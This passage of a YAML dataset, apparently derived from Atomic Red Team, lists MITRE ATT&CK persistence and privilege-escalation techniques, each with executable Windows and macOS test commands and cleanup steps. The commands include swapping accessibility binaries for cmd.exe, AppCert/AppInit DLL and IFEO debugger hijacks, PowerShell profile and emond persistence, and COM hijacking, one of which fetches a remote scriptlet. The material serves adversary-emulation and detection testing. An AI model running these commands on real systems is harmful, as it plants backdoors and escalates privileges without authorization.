        del %windir%\System32\osk.exe
        copy /Y %windir%\System32\osk.exe.bak %windir%\System32\osk.exe
        icacls %windir%\system32\osk.exe /inheritance:d
        icacls %windir%\system32\osk.exe /setowner "NT SERVICE\TrustedInstaller"
        icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F /t
        icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
        icacls %windir%\system32\osk.exe /grant:r Administrators:RX
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Atbroker.exe (AT) Executes Arbitrary Command via Registry Key
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
        atbroker /start malware_test
      cleanup: reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Auto-start application on user logon
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs" /v Configuration /t REG_SZ /d malware_test /f
      cleanup: |-
        reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
        reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs" /v Configuration /f
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Replace utilman.exe (Ease of Access Binary) with cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\utilman.exe /A
        icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
      cleanup: copy /Y C:\Windows\System32\utilman_backup.exe C:\Windows\System32\utilman.exe
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Replace Magnify.exe (Magnifier binary) with cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\Magnify.exe /A
        icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
      cleanup: copy /Y C:\Windows\System32\Magnify_backup.exe C:\Windows\System32\Magnify.exe
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Replace Narrator.exe (Narrator binary) with cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\Narrator.exe /A
        icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
      cleanup: copy /Y C:\Windows\System32\Narrator_backup.exe C:\Windows\System32\Narrator.exe
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\DisplaySwitch.exe /A
        icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
      cleanup: copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Replace AtBroker.exe (App Switcher binary) with cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\AtBroker.exe /A
        icacls C:\Windows\System32\AtBroker.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\AtBroker.exe
      cleanup: copy /Y C:\Windows\System32\AtBroker_backup.exe C:\Windows\System32\AtBroker.exe
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546/008
  is_safe: false
- id: T1546.009
  name: AppCert DLLs
  description: |-
    Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. [1](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)

    Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Create registry persistence via AppCert DLL
      type: powershell
      platform: windows
      command: |-
        Copy-Item "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll -Force
        reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /t REG_EXPAND_SZ /d "C:\Users\Public\AtomicTest.dll" /f
        if($false){Restart-Computer}
      cleanup: |-
        reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /f
        Remove-Item C:\Users\Public\AtomicTest.dll -Force
        Remove-Item C:\Users\Public\AtomicTest.txt -Force
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546/009
  is_safe: false
- id: T1546.010
  name: AppInit DLLs
  description: "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. [1](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. [2](https://support.microsoft.com/en-us/kb/197571) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. [3](https://msdn.microsoft.com/en-us/library/dn280412)"
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Install AppInit Shim
      type: cmd
      platform: windows
      command: reg.exe import "PathToAtomicsFolder\T1546.010\src\T1546.010.reg"
      cleanup: reg.exe import "PathToAtomicsFolder\T1546.010\src\T1546.010-cleanup.reg" >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546/010
  is_safe: false
- id: T1546.011
  name: Application Shimming
  description: "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. [1](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. [2](http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf) Shims can also be abused to establish persistence by continuously being invoked by affected programs."
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Application Shim Installation
      type: cmd
      platform: windows
      command: sdbinst.exe "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb"
      cleanup: sdbinst.exe -u "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb" >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: New shim database files created in the default shim database directory
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb" C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb
        Copy-Item "$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb" C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb
      cleanup: |-
        Remove-Item C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb -ErrorAction Ignore
        Remove-Item C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Registry key creation and/or modification events for SDB
      type: powershell
      platform: windows
      command: |-
        New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"
        New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"
      cleanup: |-
        Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1546.011" -ErrorAction Ignore
        Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1546.011" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546/011
  is_safe: false
- id: T1546.012
  name: Image File Execution Options Injection
  description: |-
    Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\dbg\ntsd.exe -g  notepad.exe</code>). [1](https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/)

    IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. [2](https://docs.microsoft.com/windows-hardware/drivers/debugger/gflags-overview) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. [1](https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/)

    IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). [3](https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit) [4](https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. [3](https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit) [4](https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/)

    Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the "debugger" program to be executed with SYSTEM privileges. [5](https://web.archive.org/web/20200730053039/https://www.crowdstrike.com/blog/registry-analysis-with-crowdresponse/)

    Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. [6](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.

    Malware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. [7](https://www.f-secure.com/v-descs/backdoor_w32_hupigon_emv.shtml) [8](https://www.symantec.com/security_response/writeup.jsp?docid=2008-062807-2501-99&tabid=2)
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: IFEO Add Debugger
      type: cmd
      platform: windows
      command: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /d "C:\Windows\System32\cmd.exe"
      cleanup: reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /f >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: IFEO Global Flags
      type: cmd
      platform: windows
      command: |-
        REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
        REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
        REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Windows\System32\cmd.exe"
      cleanup: |-
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /f >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: GlobalFlags in Image File Execution Options
      type: powershell
      platform: windows
      command: "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"cmd.exe /c calc.exe\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe"
      cleanup: "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"\nRemove-Item $registryPath -force"
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546/012
  is_safe: false
- id: T1546.013
  name: PowerShell Profile
  description: "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. [1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. [2](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. [3](https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html)"
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Append malicious start-process cmdlet
      type: powershell
      platform: windows
      command: |-
        Add-Content $profile -Value ""
        Add-Content $profile -Value "Start-Process calc.exe"
        powershell -Command exit
      cleanup: |-
        $oldprofile = cat $profile | Select-Object -skiplast 1
        Set-Content $profile -Value $oldprofile
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1546/013
  is_safe: true
- id: T1546.014
  name: Emond
  description: |-
    Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.

    The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.[1](https://www.xorrior.com/emond-persistence/)[2](http://www.magnusviri.com/Mac/what-is-emond.html)[3](https://www.sentinelone.com/blog/how-malware-persists-on-macos/)

    Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.[1](https://www.xorrior.com/emond-persistence/)[2](http://www.magnusviri.com/Mac/what-is-emond.html)[3](https://www.sentinelone.com/blog/how-malware-persists-on-macos/) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - macos
  executors:
    - name: Persistance with Event Monitor - emond
      type: sh
      platform: macos
      command: |-
        sudo cp "PathToAtomicsFolder/T1546.014/src/T1546.014_emond.plist" /etc/emond.d/rules/T1546.014_emond.plist
        sudo touch /private/var/db/emondClients/T1546.014
      cleanup: |-
        sudo rm /etc/emond.d/rules/T1546.014_emond.plist
        sudo rm /private/var/db/emondClients/T1546.014
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546/014
  is_safe: false
- id: T1546.015
  name: Component Object Model Hijacking
  description: "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.[1](https://msdn.microsoft.com/library/ms694363.aspx)  References to various COM objects are stored in the Registry. \n\nAdversaries may use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.[2](https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. \n\nOne variation of COM hijacking involves abusing Type Libraries (TypeLibs), which provide metadata about COM objects, such as their interfaces and methods. Adversaries may modify Registry keys associated with TypeLibs to redirect legitimate COM object functionality to malicious scripts or payloads. Unlike traditional COM hijacking, which commonly uses local DLLs, this variation may leverage the \"script:\" moniker to execute remote scripts hosted on external servers.[3](https://reliaquest.com/blog/threat-spotlight-hijacked-and-hidden-new-backdoor-and-persistence-technique/) This approach enables stealthy execution of code while maintaining persistence, as the remote payload would be automatically downloaded whenever the hijacked COM object is accessed."
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: COM Hijacking - InprocServer32
      type: powershell
      platform: windows
      command: |-
        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'
        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Value "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll"
        New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType "String"
        Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
      cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Powershell Execute COM Object
      type: powershell
      platform: windows
      command: |-
        $o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))
        $item = $o.Item()
        $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
      cleanup: Get-Process -Name "*calc" | Stop-Process
      timeout: 120
      is_safe: true
    - name: COM Hijacking with RunDLL32 (Local Server Switch)
      type: powershell
      platform: windows
      command: |-
        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'
        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Value "PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll"
        New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Name 'ThreadingModel' -Value 'Both' -PropertyType "String"
        Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
      cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: COM hijacking via TreatAs
      type: powershell
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /ve /T REG_SZ /d "AtomicTest" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00" /ve /T REG_SZ /d "AtomicTest" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /T REG_SZ /d "AtomicTest" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d "C:\WINDOWS\system32\scrobj.dll" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /T REG_SZ /d "Apartment" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID" /ve /T REG_SZ /d "AtomicTest" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /T REG_SZ /d "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID" /ve /T REG_SZ /d "AtomicTest" /f

        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f

        rundll32.exe -sta "AtomicTest"
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /f
        reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f
        reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1546/015
  is_safe: true
- id: T1548.001
  name: Setuid and Setgid
  description: |-
    An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.[1](http://man7.org/linux/man-pages/man2/setuid.2.html) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.

    Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.

    Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.[2](https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/) This abuse is often part of a "shell escape" or other actions to bypass an execution environment with restricted permissions.

